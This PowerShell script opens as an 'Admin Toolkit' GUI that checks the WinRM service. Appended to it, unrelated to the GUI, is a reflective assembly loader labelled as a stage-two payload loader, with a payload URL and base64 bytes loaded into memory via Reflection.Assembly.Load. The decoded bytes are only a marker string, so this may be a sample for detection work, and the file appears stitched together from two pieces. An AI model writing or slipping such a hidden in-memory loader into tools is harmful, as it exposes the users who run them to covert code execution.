Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Admin Toolkit'
$form.Size = New-Object System.Drawing.Size(840, 540)
$form.StartPosition = 'CenterScreen'

$button = New-Object System.Windows.Forms.Button
$button.Text = 'Check'
$button.Location = New-Object System.Drawing.Point(18, 18)
$button.Add_Click({
    Get-Service -Name 'WinRM' | Select-Object Name, Status | Out-String | Write-Host
})
$form.Controls.Add($button)

[void]$form.ShowDialog()
$form.Dispose()
<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\stage2.ps1
#>
$Stage2Url = "http://contoso.com/payload.bin"
$ErrorActionPreference = "Stop"

try {
    $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpvbGg3MWt5emds")
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $OperationResult = [Reflection.Assembly]::Load($StageBytes)
    if ($null -ne $OperationResult) {
        Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
